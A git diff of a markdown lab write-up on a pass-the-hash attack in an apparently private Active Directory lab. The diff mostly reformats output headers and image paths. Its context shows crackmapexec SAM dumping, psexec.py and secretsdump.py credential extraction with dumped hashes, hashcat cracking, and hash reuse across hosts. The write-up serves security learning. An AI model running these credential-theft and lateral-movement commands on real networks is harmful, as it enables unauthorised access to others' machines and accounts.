@@ -77,7 +77,7 @@ crackmapexec smb 192.168.5.0/24 -u rahimkhan -d READTEAMBD.local -p Password1 --
 - `p Password1` - Password for the specified user account.
 - `--sam`	- Dumps local SAM (Security Account Manager) password hashes from systems where administrative access is available.
 
-Output:
+**Output:**
 
 ```
 SMB         192.168.5.136   445    VICTIM-2         [*] Windows 10 / Server 2019 Build 19041 x64 (name:VICTIM-2) (domain:READTEAMBD.local) (signing:False) (SMBv1:False)
@@ -107,7 +107,7 @@ rahimkhan has local admin on both VICTIM-1 and VICTIM-2 — that's what (Pwn3d!)
 One thing to notice — VICTIM-1's Administrator and rahim have the exact same NT hash (64f12cdd...). VICTIM-2's karim has that same hash too. So all three accounts have the same password.
 
 <p align="center">
-  <img src="/writeups/04-pass the hash/images/step1-1.png" width="600">
+  <img src="/Active-Directory/04-pass the hash/images/step1-1.png" width="600">
 </p>
 
 I then used `PsExec` to connect to VICTIM-1 as rahimkhan, and the authentication succeeded.
@@ -115,6 +115,8 @@ I then used `PsExec` to connect to VICTIM-1 as rahimkhan, and the authentication
 ```bash
 psexec.py readteambd/rahimkhan:Password1@192.168.5.135
 ```
+
+**Output:**
 
 ```
 [*] Found writable share ADMIN$
@@ -130,7 +132,7 @@ Victim-1
 ```
 
 <p align="center">
-  <img src="/writeups/04-pass the hash/images/step1-2.png" width="600">
+  <img src="/Active-Directory/04-pass the hash/images/step1-2.png" width="600">
 </p>
 
 I'm SYSTEM on VICTIM-1. Now I want to do a proper full hash dump.
@@ -145,10 +147,9 @@ Although `CrackMapExec` had already dumped the local SAM hashes, `secretsdump.py
 
 I ran it against both compromised machines to collect as much credential material as possible.
 
-VICTIM-1:
+**VICTIM-1 Output:**
 
 ```
-
 [*] Service RemoteRegistry is in stopped state
 [*] Service RemoteRegistry is disabled, enabling it
 [*] Starting service RemoteRegistry
@@ -182,14 +183,14 @@ NL$KM:4b8fca52bf95f183bd044d00f506d9a5d7acc0e8e595e93ceab740ae2e583afacbd830185a
 [*] Restoring the disabled state for service RemoteRegistry
 ```
 <p align="center">
-  <img src="/writeups/04-pass the hash/images/step2-1.png" width="600">
+  <img src="/Active-Directory/04-pass the hash/images/step2-1.png" width="600">
 </p>
 
 ```bash
 secretsdump.py readteambd/rahimkhan:Password1@192.168.5.136
 ```
 
-VICTIM-2:
+**VICTIM-2 Output:**
 ```
 [*] Service RemoteRegistry is in stopped state
 [*] Service RemoteRegistry is disabled, enabling it
@@ -224,7 +225,7 @@ NL$KM:c7b7b5bda0d33e8662bffb11e1899ab8aaebb5b87948115fcbecc5993510e8604427d5cb0a
 [*] Restoring the disabled state for service RemoteRegistry
 ```
 <p align="center">
-  <img src="/writeups/04-pass the hash/images/step2-2.png" width="600">
+  <img src="/Active-Directory/04-pass the hash/images/step2-2.png" width="600">
 </p>
 
 ## Step 3 — Save the Hashes
@@ -246,13 +247,12 @@ hashcat -m 1000 passthehash.txt /usr/share/wordlists/rockyou.txt
 
 After running the command, Hashcat cracked one of the hashes and recovered the password.
 
-Results:
+**Results:**
 
 ```
 64f12cddaa88057e06a81b54e73b949b:Password1                
 31d6cfe0d16ae931b73c59d7e0c089c0:                         
 Approaching final keyspace - workload adjusted.           
-
                                                           
 Session..........: hashcat
 Status...........: Exhausted
@@ -274,10 +274,10 @@ Candidates.#01...:  laylanie -> $HEX[042a0337c2a156616d6f732103]
 Hardware.Mon.#01.: Util: 23%
 ```
 
-Password1 is the password behind 64f12cdd... — so Administrator on VICTIM-1, rahim, and karim all use Password1. The other hash 31d6cfe0... is an empty password — that's Guest, DefaultAccount.
+`Password1` is the password behind 64f12cdd... — so Administrator on VICTIM-1, rahim, and karim all use `Password1`. The other hash 31d6cfe0... is an empty password — that's Guest, DefaultAccount.
 
 <p align="center">
-  <img src="/writeups/04-pass the hash/images/step4-1.png" width="600">
+  <img src="/Active-Directory/04-pass the hash/images/step4-1.png" width="600">
 </p>
 
 # Step 5 — Pass the Hash with CrackMapExec
@@ -288,7 +288,7 @@ I used the NTLM hash instead of a password by passing it with the `-H` option in
 crackmapexec smb 192.168.5.0/24 -u administrator -H 64f12cddaa88057e06a81b54e73b949b --local-auth
 ```
 
-Result:
+**Output:**
 
 ```
 SMB         192.168.5.136   445    VICTIM-2         [*] Windows 10 / Server 2019 Build 19041 x64 (name:VICTIM-2) (domain:VICTIM-2) (signing:False) (SMBv1:False)
@@ -302,7 +302,7 @@ VICTIM-1 was successfully accessed because the Administrator account there uses 
 VICTIM-2 failed because its local Administrator account uses a different hash (31d6cfe0d16ae931b73c59d7e0c089c0), which corresponds to a blank password. So the hash I used did not match that system.
 
 <p align="center">
-  <img src="/writeups/04-pass the hash/images/step5-1.png" width="600">
+  <img src="/Active-Directory/04-pass the hash/images/step5-1.png" width="600">
 </p>
 
 ## Mitigation
